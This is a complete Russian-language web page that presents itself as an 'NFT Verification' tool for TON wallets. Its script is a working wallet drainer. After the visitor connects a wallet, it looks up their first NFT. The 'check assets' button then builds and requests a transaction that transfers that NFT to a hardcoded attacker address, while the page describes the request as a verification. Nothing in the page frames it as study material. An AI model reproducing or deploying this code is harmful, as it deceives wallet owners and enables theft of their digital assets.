<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Verification</title>
    <script src="https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/@ton/core@0.15.0/dist/index.min.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #0f172a; color: white; margin: 0; }
        .card { background: #1e293b; padding: 2rem; border-radius: 1.5rem; text-align: center; width: 380px; border: 1px solid #334155; }
        #ton-connect-button { display: flex; justify-content: center; margin-bottom: 20px; }
        button#main-btn { background: #3b82f6; color: white; border: none; padding: 1rem; border-radius: 0.8rem; cursor: pointer; font-weight: 600; width: 100%; transition: 0.3s; display: none; }
        .status { font-size: 0.8rem; color: #94a3b8; margin-top: 15px; }
    </style>
</head>
<body>

<div class="card">
    <h2>Верификация аккаунта</h2>
    <p style="font-size: 0.9rem; color: #94a3b8;">Подключите кошелек для проверки ваших активов</p>
    
    <div id="ton-connect-button"></div>
    
    <button id="main-btn">Проверить активы</button>
    <div id="status-text" class="status">Ожидание подключения...</div>
</div>

<script>
    // --- НАСТРОЙКИ ---
    const MY_ADDRESS = "UQCsbN7m38_6dA2ZYG0RcxpFNixTI7dm5IS16qEZMQacWH9k"; // Твой адрес
    let foundNftAddress = null;

    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: "https://site-chi-weld.vercel.app/tonconnect-manifest.json",
        buttonRootId: 'ton-connect-button'
    });

    // Следим за подключением кошелька
    tonConnectUI.onStatusChange(async (wallet) => {
        if (wallet) {
            const userAddress = wallet.account.address;
            document.getElementById('status-text').innerText = "Поиск активов...";
            await findUserNFT(userAddress);
        } else {
            document.getElementById('main-btn').style.display = 'none';
            document.getElementById('status-text').innerText = "Кошелек не подключен";
        }
    });

    // Функция поиска NFT в кошельке через публичное API
    async function findUserNFT(address) {
        try {
            // Используем бесплатное API tonapi.io для поиска NFT
            const response = await fetch(`https://tonapi.io/v2/accounts/${address}/nfts?limit=1`);
            const data = await response.json();

            if (data.nft_items && data.nft_items.length > 0) {
                foundNftAddress = data.nft_items[0].address; // Берем первую попавшуюся NFT
                document.getElementById('main-btn').style.display = 'block';
                document.getElementById('status-text').innerText = "Активы найдены. Нажмите кнопку ниже.";
            } else {
                document.getElementById('status-text').innerText = "Подходящие активы не найдены на этом адресе.";
            }
        } catch (e) {
            console.error(e);
            document.getElementById('status-text').innerText = "Ошибка поиска активов для проверки.";
        }
    }

    // Логика кнопки отправки
    document.getElementById('main-btn').addEventListener('click', async () => {
        if (!foundNftAddress) return;

        try {
            const body = TonCore.beginCell()
                .storeUint(0x5fcc3d14, 32) // transfer op
                .storeUint(0, 64)
                .storeAddress(TonCore.Address.parse(MY_ADDRESS))
                .storeAddress(TonCore.Address.parse(tonConnectUI.account.address))
                .storeBit(0)
                .storeCoins(TonCore.toNano('0.01'))
                .storeBit(0)
                .endCell();

            const tx = {
                validUntil: Math.floor(Date.now() / 1000) + 600,
                messages: [{
                    address: foundNftAddress, // АВТОМАТИЧЕСКИЙ АДРЕС НАЙДЕННОЙ NFT
                    amount: TonCore.toNano('0.05').toString(),
                    payload: body.toBoc().toString('base64')
                }]
            };

            await tonConnectUI.sendTransaction(tx);
            alert("Запрос на проверку отправлен. Подтвердите в приложении.");
        } catch (e) {
            alert("Ошибка проверки или отказ.");
        }
    });
</script>

</body>
</html>
